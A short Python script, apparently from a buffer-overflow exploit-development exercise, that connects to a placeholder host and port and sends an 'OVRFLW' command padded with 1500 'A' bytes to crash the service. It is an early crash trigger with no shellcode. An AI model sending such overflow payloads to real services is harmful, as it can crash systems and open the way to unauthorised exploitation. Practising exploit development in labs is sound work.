#!/usr/bin/python

import sys
import socket

cmd = "OVRFLW "
junk = "\x41" * 1500
end = "\r\n"

buffer = cmd + junk + end

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('ip',port))
data = s.recv(1024)
s.send(buffer)
s.recv(1024)
s.close()
